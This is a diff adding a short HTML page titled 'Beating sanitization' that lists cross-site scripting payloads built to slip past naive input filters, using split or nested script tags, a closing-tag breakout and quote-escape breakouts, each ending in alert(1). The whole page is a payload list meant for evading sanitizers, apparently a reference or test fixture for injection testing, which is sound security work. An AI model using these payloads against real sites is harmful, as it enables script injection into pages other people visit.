@@ -1,0 +1,11 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Beating sanitization</title>
+</head><body><tt>&lt;script&gt;&lt;script&gt;alert(1)&lt;/script&gt;<br/>
+&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/script&gt;<br/>
+&lt;scr&lt;object&gt;ipt&gt;alert(1)&lt;/script&gt;<br/>
+&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;<br/>
+<br/>
+foo\'; alert(1);//<br/>
+foo&amp;apos;; alert(1);//</tt></body></html>
